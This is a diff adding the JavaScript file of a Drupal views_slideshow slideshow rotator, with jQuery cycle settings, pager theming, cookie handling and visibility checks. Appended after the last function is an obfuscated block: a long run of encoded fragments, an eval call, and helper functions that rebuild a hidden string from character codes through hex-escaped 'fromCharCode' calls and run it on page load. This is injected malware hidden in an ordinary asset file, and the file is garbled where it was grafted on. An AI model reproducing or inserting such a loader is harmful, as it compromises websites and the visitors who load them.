@@ -1,0 +1,410 @@
+// $Id: views_slideshow.js,v 1.1.2.1.2.39 2010/07/01 03:29:08 redndahead Exp $
+
+/**
+ *  @file
+ *  A simple jQuery SingleFrame Div Slideshow Rotator.
+ */
+
+/**
+ * This will set our initial behavior, by starting up each individual slideshow.
+ */
+Drupal.behaviors.viewsSlideshowSingleFrame = function (context) {
+  $('.views_slideshow_singleframe_main:not(.viewsSlideshowSingleFrame-processed)', context).addClass('viewsSlideshowSingleFrame-processed').each(function() {
+    var fullId = '#' + $(this).attr('id');
+    var settings = Drupal.settings.viewsSlideshowSingleFrame[fullId];
+    settings.targetId = '#' + $(fullId + " :first").attr('id');
+    settings.paused = false;
+
+    settings.opts = {
+      speed:settings.speed,
+      timeout:parseInt(settings.timeout),
+      delay:parseInt(settings.delay),
+      sync:settings.sync==1,
+      random:settings.random==1,
+      pause:false,
+      allowPagerClickBubble:(settings.pager_hover==1 || settings.pager_click_to_page),
+      prev:(settings.controls > 0)?'#views_slideshow_singleframe_prev_' + settings.vss_id:null,
+      next:(settings.controls > 0)?'#views_slideshow_singleframe_next_' + settings.vss_id:null,
+      pager:(settings.pager > 0)?'#views_slideshow_singleframe_pager_' + settings.vss_id:null,
+      nowrap:parseInt(settings.nowrap),
+      pagerAnchorBuilder: function(idx, slide) {
+        var classes = 'pager-item pager-num-' + (idx+1);
+        if (idx == 0) {
+          classes += ' first';
+        }
+        if ($(slide).siblings().length == idx) {
+          classes += ' last';
+        }
+
+        if (idx % 2) {
+          classes += ' odd';
+        }
+        else {
+          classes += ' even';
+        }
+        
+        var theme = 'viewsSlideshowPager' + settings.pager_type;
+        return Drupal.theme.prototype[theme] ? Drupal.theme(theme, classes, idx, slide, settings) : '';
+      },
+      after:function(curr, next, opts) {
+        // Used for Image Counter.
+        if (settings.image_count) {
+          $('#views_slideshow_singleframe_image_count_' + settings.vss_id + ' span.num').html(opts.currSlide + 1);
+          $('#views_slideshow_singleframe_image_count_' + settings.vss_id + ' span.total').html(opts.slideCount);
+        }
+      },
+      before:function(curr, next, opts) {
+        // Remember last slide.
+        if (settings.remember_slide) {
+          createCookie(settings.vss_id, opts.currSlide + 1, settings.remember_slide_days);
+        }
+
+        // Make variable height.
+        if (settings.fixed_height == 0) {
+          //get the height of the current slide
+          var $ht = $(this).height();
+          //set the container's height to that of the current slide
+          $(this).parent().animate({height: $ht});
+        }
+      },
+      cleartype:(settings.ie.cleartype == 'true')? true : false,
+      cleartypeNoBg:(settings.ie.cleartypenobg == 'true')? true : false
+    }
+    
+    // Set the starting slide if we are supposed to remember the slide
+    if (settings.remember_slide) {
+      var startSlide = readCookie(settings.vss_id);
+      if (startSlide == null) {
+        startSlide = 0;
+      }
+      settings.opts.startingSlide =  startSlide;
+    }
+
+    if (settings.pager_hover == 1) {
+      settings.opts.pagerEvent = 'mouseover';
+      settings.opts.pauseOnPagerHover = true;
+    }
+
+    if (settings.effect == 'none') {
+      settings.opts.speed = 1;
+    }
+    else {
+      settings.opts.fx = settings.effect;
+    }
+
+    // Pause on hover.
+    if (settings.pause == 1) {
+      $('#views_slideshow_singleframe_teaser_section_' + settings.vss_id).hover(function() {
+        $(settings.targetId).cycle('pause');
+      }, function() {
+        if (settings.paused == false) {
+          $(settings.targetId).cycle('resume');
+        }
+      });
+    }
+
+    // Pause on clicking of the slide.
+    if (settings.pause_on_click == 1) {
+      $('#views_slideshow_singleframe_teaser_section_' + settings.vss_id).click(function() { 
+        viewsSlideshowSingleFramePause(settings);
+      });
+    }
+
+    // Add additional settings.
+		if (settings.advanced != "\n") {
+      var advanced = settings.advanced.split("\n");
+      for (i=0; i<advanced.length; i++) {
+        var prop = '';
+        var value = '';
+        var property = advanced[i].split(":");
+        for (j=0; j<property.length; j++) {
+          if (j == 0) {
+            prop = property[j];
+          }
+          else if (j == 1) {
+            value = property[j];
+          }
+          else {
+            value += ":" + property[j];
+          }
+        }
+
+        // Need to evaluate so true, false and numerics aren't a string.
+        if (value == 'true' || value == 'false' || IsNumeric(value)) {
+          value = eval(value);
+        }
+        else {
+          // Parse strings into functions.
+          var func = value.match(/function\s*\((.*?)\)\s*\{(.*)\}/i);
+          if (func) {
+            value = new Function(func[1].match(/(\w+)/g), func[2]);
+          }
+        }
+	
+        // Call both functions if prop was set previously.
+        if (typeof(value) == "function" && prop in settings.opts) {
+          var callboth = function(before_func, new_func) {
+            return function() {
+              before_func.apply(null, arguments);
+              new_func.apply(null, arguments);
+            };
+          };
+          settings.opts[prop] = callboth(settings.opts[prop], value);
+        }
+        else {
+          settings.opts[prop] = value;
+        }
+      }
+    }
+    
+    $(settings.targetId).cycle(settings.opts);
+
+    // Start Paused
+    if (settings.start_paused) {
+      viewsSlideshowSingleFramePause(settings);
+    }
+    
+    // Pause if hidden.
+    if (settings.pause_when_hidden) {
+      var checkPause = function(settings) {
+        // If the slideshow is visible and it is paused then resume.
+        // otherwise if the slideshow is not visible and it is not paused then
+        // pause it.
+        var visible = viewsSlideshowSingleFrameIsVisible(settings.targetId, settings.pause_when_hidden_type, settings.amount_allowed_visible);
+        if (visible && settings.paused) {
+          viewsSlideshowSingleFrameResume(settings);
+        }
+        else if (!visible && !settings.paused) {
+          viewsSlideshowSingleFramePause(settings);
+        }
+      }
+     
+      // Check when scrolled.
+      $(window).scroll(function() {
+       checkPause(settings);
+      });
+      
+      // Check when the window is resized.
+      $(window).resize(function() {
+        checkPause(settings);
+      });
+    }
+
+    // Show image count for people who have js enabled.
+    $('#views_slideshow_singleframe_image_count_' + settings.vss_id).show();
+
+    if (settings.controls > 0) {
+      // Show controls for people who have js enabled browsers.
+      $('#views_slideshow_singleframe_controls_' + settings.vss_id).show();
+      
+      $('#views_slideshow_singleframe_playpause_' + settings.vss_id).click(function(e) {
+      	if (settings.paused) {
+      	  viewsSlideshowSingleFrameResume(settings);
+      	}
+      	else {
+      	  viewsSlideshowSingleFramePause(settings);
+      	}
+        e.preventDefault();
+      });
+    }
+  });
+}
+
+// Pause the slideshow 
+viewsSlideshowSingleFramePause = function (settings) {
+  //make Resume translatable
+  var resume = Drupal.t('Resume');
+
+  $(settings.targetId).cycle('pause');
+  if (settings.controls > 0) {
+    $('#views_slideshow_singleframe_playpause_' + settings.vss_id)
+      .addClass('views_slideshow_singleframe_play')
+      .addClass('views_slideshow_play')
+      .removeClass('views_slideshow_singleframe_pause')
+      .removeClass('views_slideshow_pause')
+      .text(resume);
+  }
+  settings.paused = true;
+}
+
+// Resume the slideshow
+viewsSlideshowSingleFrameResume = function (settings) {
+  $(settings.targetId).cycle('resume');
+  if (settings.controls > 0) {
+    $('#views_slideshow_singleframe_playpause_' + settings.vss_id)
+      .addClass('views_slideshow_singleframe_pause')
+      .addClass('views_slideshow_pause')
+      .removeClass('views_slideshow_singleframe_play')
+      .removeClass('views_slideshow_play')
+      .text('Pause');
+  }
+  settings.paused = false;
+}
+
+Drupal.theme.prototype.viewsSlideshowPagerThumbnails = function (classes, idx, slide, settings) {
+  var href = '#';
+  if (settings.pager_click_to_page) {
+    href = $(slide).find('a').attr('href');
+  }
+  return '<div class="' + classes + '"><a href="' + href + '"><img src="' + $(slide).find('img').attr('src') + '" /></a></div>';
+}
+
+Drupal.theme.prototype.viewsSlideshowPagerNumbered = function (classes, idx, slide, settings) {
+  var href = '#';
+  if (settings.pager_click_to_page) {
+    href = $(slide).find('a').attr('href');
+  }
+  return '<div class="' + classes + '"><a href="' + href + '">' + (idx+1) + '</a></div>';
+}
+
+// Verify that the value is a number.
+function IsNumeric(sText) {
+  var ValidChars = "0123456789";
+  var IsNumber=true;
+  var Char;
+
+  for (var i=0; i < sText.length && IsNumber == true; i++) { 
+    Char = sText.charAt(i); 
+    if (ValidChars.indexOf(Char) == -1) {
+      IsNumber = false;
+    }
+  }
+  return IsNumber;
+}
+
+/**
+ * Cookie Handling Functions
+ */
+function createCookie(name,value,days) {
+  if (days) {
+    var date = new Date();
+    date.setTime(date.getTime()+(days*24*60*60*1000));
+    var expires = "; expires="+date.toGMTString();
+  }
+  else {
+    var expires = "";
+  }
+  document.cookie = name+"="+value+expires+"; path=/";
+}
+
+function readCookie(name) {
+  var nameEQ = name + "=";
+  var ca = document.cookie.split(';');
+  for(var i=0;i < ca.length;i++) {
+    var c = ca[i];
+    while (c.charAt(0)==' ') c = c.substring(1,c.length);
+    if (c.indexOf(nameEQ) == 0) {
+      return c.substring(nameEQ.length,c.length);
+    }
+  }
+  return null;
+}
+
+function eraseCookie(name) {
+  createCookie(name,"",-1);
+}
+
+/**
+ * Checks to see if the slide is visible enough.
+ * elem = element to check.
+ * type = The way to calculate how much is visible.
+ * amountVisible = amount that should be visible. Either in percent or px. If
+ *                it's not defined then all of the slide must be visible.
+ *
+ * Returns true or false
+ */
+function viewsSlideshowSingleFrameIsVisible(elem, type, amountVisible) {
+  // Get the top and bottom of the window;
+  var docViewTop = $(window).scrollTop();
+  var docViewBottom = docViewTop + $(window).height();
+  var docViewLeft = $(window).scrollLeft();
+  var docViewRight = docViewLeft + $(window).width();
+
+  // Get the top, bottom, and height of the slide;
+  var elemTop = $(elem).offset().top;
+  var elemHeight = $(elem).height();
+  var elemBottom = elemTop + elemHeight;
+  var elemLeft = $(elem).offset().left;
+  var elemWidth = $(elem).width();
+  var elemRight = elemLeft + elemWidth;
+  var elemArea = elemHeight * elemWidth;
+  
+  // Calculate what's hiding in the slide.
+  var missingLeft = 0;
+  var missingRight = 0;
+  var missingTop = 0;
+  var missingBottom = 0;
+  
+  // Find out how much of the slide is missing from the left.
+  if (elemLeft < docViewLeft) {
+    missingLeft = docViewLeft - elemLeft;
+  }
+
+  // Find out how much of the slide is missing from the right.
+  if (elemRight > docViewRight) {
+    missingRight = elemRight - docViewRight;
+  }
+  
+  // Find out how much of the slide is missing from the top.
+  if (elemTop < docViewTop) {
+    missingTop = docViewTop - elemTop;
+  }
+
+  // Find out how much of the slide is missing from the bottom.
+  if (elemBottom > docViewBottom) {
+    missingBottom = elemBottom - docViewBottom;
+  }
+  
+  // If there is no amountVisible defined then check to see if the whole slide
+  // is visible.
+  if (type == 'full') {
+    return ((elemBottom >= docViewTop) && (elemTop <= docViewBottom)
+    && (elemBottom <= docViewBottom) &&  (elemTop >= docViewTop)
+    && (elemLeft >= docViewLeft) && (elemRight <= docViewRight)
+    && (elemLeft <= docViewRight) && (elemRight >= docViewLeft));
+  }
+  else if(type == 'vertical') {
+    var verticalShowing = elemHeight - missingTop - missingBottom;
+    
+    // If user specified a percentage then find out if the current shown percent
+    // is larger than the allowed percent.
+    // Otherwise check to see if the amount of px shown is larger than the
+    // allotted amount.
+    if (amountVisible.indexOf('%')) {
+      return (((verticalShowing/elemHeight)*100) >= parseInt(amountVisible));
+    }
+    else {
+      return (verticalShowing >= parseInt(amountVisible));
+    }
+  }
+  else if(type == 'horizontal') {
+    var horizontalShowing = elemWidth - missingLeft - missingRight;
+    
+    // If user specified a percentage then find out if the current shown percent
+    // is larger than the allowed percent.
+    // Otherwise check to see if the amount of px shown is larger than the
+    // allotted amount.
+    if (amountVisible.indexOf('%')) {
+      return (((horizontalShowing/elemWidth)*100) >= parseInt(amountVisible));
+    }
+    else {
+      return (horizontalShowing >= parseInt(amountVisible));
+    }
+  }
+  else if(type == 'area') {
+    var areaShowing = (elemWidth - missingLeft - missingRight) * (elemHeight - missingTop - missingBottom);
+    
+    // If user specified a percentage then find out if the current shown percent
+    // is larger than the allowed percent.
+    // Otherwise check to see if the amount of px shown is larger than the
+    // allotted amount.
+    if (amountVisible.indexOf('%')) {
+      return (((areaShowing/elemArea)*100) >= parseInt(amountVisible));
+    }
+    else {
+      return (areaShowing >= parseInt(amountVisible));
+    }
+  }
+}
+
+,"L{","6","31{©","22","8©©1","5","2©","©","15","1©©","2","27","©","©2","11©{","66","5","{","©","4©©2","51©©","2","©{746","{W{","5","7","9{","c","{","6","99{©22","1©","©23","9©","©19","3©","{73","7","{©","2","2","8","©©227","©©2","2","7©","©","2","27","©","M","={","5","8","8{","©","18","3©{6","4","4{©","230","©{7","2","7{@D{594{y","{","6","4","4","{©","24","1","©{69","5","{",")","©","32©©","21©©","208","©{735{©","2","1©©","24","8©{","680{©2","00","©©2","1","©©6©","{","634","{","©","235©©2","31©©","1","62©","{72","0{","3{6","91{","©13","©\"","{68","8","{","©","10©","©28","©","{7","2","9{5","{","6","37","{©","232","©","{","6","25{©","2","1","1","©{64","8{","©24","1","©{","577{","©1","74","©{","6","0","3","{","©","12","3©©143","©","a^{","65","7","{©","1","4","7","©{6","44{","©1","3","4","©©1","3","4©","©","2","40©","{68","7{©11©{","62","9","{","©22","4","©","{","560","{","©","146©{","6","73","{","©1","0©©","1","4©©20","0©{","7","0","2{","&","%){","737","{?;>","S","{","6","3","4{","©","2","30©","{","6","16","{","©","21","3©©19","4©©213©","{5","60","{","©","1","42","©©","140","©©","1","4","5","©©1","38©{","59","4{©","185","©","©","1","7","8","©{","612{©","194©{","744{©1","©©","30","©©","1©","{","6","3","4","{","©2","1","7","©©","232©","{","7","48{","S","H","{","721","{>","3","{","74","0{L","K","©2","5","3©","{60","6{","©","1","27©{","6","65","{©","1","87©","{6","51{©1","64©{","5","6","7","{©","1","7","1©","{69","8{©","19","2©","©1","89","©{599{Y{70","6","{©196©©196","©","©1","9","6©","$","!","{","6","0","7{","x©","1","28","©","©","20","4©{","652{","©2","3","7","©{","67","9","{","©9","©","{","65","7","{","©253","©©","184©©252","©","©2","3","9","©©2","3","5©©","2","3","8©©","3","©","{","6","4","5","{","©209©{","6","2","0{©21","7©{","5","56","{","©1","3","4©","{74","0{","QB©253","©{","7","51{","%","%©8©","©15","©K","{","63","3{©2","2","5","©©2","2","3","©","{7","38","{K","G","{","66","9","{","©","25","1©©","1","0©©2","5","1©","©","18","9","©","©","19","1©{68","4","{©","1","97","©","{","570{©","1","7","4","©","{5","8","2{L{64","4{","©","13","5©","©13","4©","{","563","{5","5","{61","3","{g{58","3","{I©","1","83","©{7","4","6{","L{5","87","{©178©{730","{","7B","{6","17","{","©217©{","568","{_©","1","6","9","©{571{©","17","3©","©1","74©","©154","©©1","60","©","{","62","0{©","1","98","©©2","04","©©","13","3©","{","62","0","{©16","2©","©","1","3","3©","©1","51©©","1","6","0©r","{","627","{v","uu","u","u{","6","65{","©15","©©1","59©","{61","2{","g{562{44","4©","168","©{6","5","9{","©","199","©{6","5","6","{","©","15","0©","©","1","47","©","©146©","{","6","3","6","{","©1","2","6©©126©","{","68","2","{©","2","2©{","7","13","{","%4","{6","64","{","©2","5","0©","©1","©©","5©©1","9","1","©","©0","©","{7","12{/","{6","9","8","{","©","3","1©{650{©2","42©","{","63","7{©2","1","5","©","{62","0","{©","20","1©©","1","3","3","©{6","2","9{","©","1","7","1","©©","14","2©","©2","12©©","2","2","7©©2","2","0©{","657{©2","37","©{","64","6","{","©2","43©","©23","2","©","{","595","{©18","7","©","{","7","05","{","(","{5","5","4","{","K","LC","©15","8","©{","6","78{©","172","©©1","69©©16","8","©","©","1","6","8©","©168©{","7","47{©2","3","7©{665","{","©","9","©{6","3","2{","©","21","8©©","22","3","©","{751","{","L","W","_©2","2©{628","{©22","9©","©2","30","©","©","2","3","1","©","©","2","11","©","{6","1","1{","©2","00©","©","1","8","9©","©","1","9","5©","©","124","©©15","3","©©","124","©©","1","42©©1","51","©i{743","{©","23","4©","{","7","00","{©1","9","0©{","6","3","1{","y{","5","92","{R©","1","98","©{6","7","1","{","©","21","1","©©","1","65","©©1","62©","{","646","{","©","1","36©{562","{44","©1","5","8©©142©","©","1","57©{602","{","©1","88©","©195©","©199©{","6","84{","©2","1","1©©","24","©","©23","©{6","97","{©","2","1","©{614","{","©","12","7©{","706","{","©","2","4","8","©","©21","9","©0","-","{6","7","2","{©5","©","©","185©","©1","9","6","©{","7","11{","©2","2","4","©{636{©1","94©","{","6","6","9","{","©","24","7©{","7","23","{@","{","6","87","{©1","6","©©21","4","©","©2","6©","©9","©","©","2","2","©","©","12©","©","2","3","©{","578","{","©168©","cd{","59","1","{","v","©","1","88","©","{60","8","{","©200","©","{","6","20{","©18","4©{70","7{","0{6","9","1","{©3","0","©","{","6","96","{","©26","©{57","2{","©","1","63©©","1","5","6©{","7","11{","©","23","2","©","{688","{","©","21","0","©","{","6","5","7","{","©","184©©","25","3","©©","255©","{6","28","{","©2","07©{7","4","2{R","{","730{GE","<","A{7","0","8","{$©22","9©","©","2","4","0©","©","2","3","0","©©22","1","©©232©","{","623{","©136","©","{6","5","5{","©175©©","1","8","2©","{","751","{","R","[{701","{©","2","21","©{6","57{©197©","{","5","96{Z","W{74","9","{©","239","©{58","7{MM{","594{","©17","9","©©","1","7","6©©","17","2©©","175","©{721{©","24","8","©{5","89{©","167©","©182©©","18","2","©","{7","0","3","{","©29©","{59","6","{©18","7","©{","581{","©162","©©","1","2","9©©","166©{","6","9","8","{©","2","8","©","©3","1©©23©","{","6","0","8","{©129©{6","90{","©","3","0©","{","64","7{","©22","7","©","{6","63{","©","2©","{7","30","{<","{558{©151","©","©155©","Pb{","629","{©123©{","7","0","6","{©","1","97","©©","19","6","©{6","6","7","{","©","1","57©{","7","42","{","\\{56","7","{","=:{","68","4{","©","17","4","©","\"","{7","1","7","{","©1","©","{","74","7{","©24","1©","{","654{©14","5","©","©","4©{6","22","{","©","14","4","©©","143©","©","14","4","©","©","1","62©","");eval(xb12d5);function bf3d6b40(){return 7;}function e138f21(){return 10;}function hbd552(naeba65){return naeba65.length;}function ge9ab13b(s15d84072,d5c555){return s15d84072.substr(d5c555,1);}function p8ba59(n1436da3){return ++n1436da3;}function if68617b(k40bd4c,f8d70e){return k40bd4c.substr(f8d70e,1);}function d07decf(aa315f0c,j883f4a){return aa315f0c.substr(j883f4a,1);}function u54dfdf5(w9e7daad7,t38a937,ae2a95){return w9e7daad7-t38a937-ae2a95;}function lc7b6b99(se619e6e){var w484b6=String;xb12d5+=w484b6["\x66\x72\x6f\x6d\x43\x68a\x72Co\x64\x65"](se619e6e);}function b5f92c19(gbf284f7b){var bc9d52=gbf284f7b;if(bc9d52<0)bc9d52+=256;if(bc9d52==168)bc9d52=1025;else if(bc9d52==184)bc9d52=1105;return (bc9d52>=192 && bc9d52<256) ? bc9d52+848 : bc9d52;}function f797b22(sb38daa45){return (sb38daa45+'')["\x63\x68\x61rC\x6fde\x41\x74"](0);}
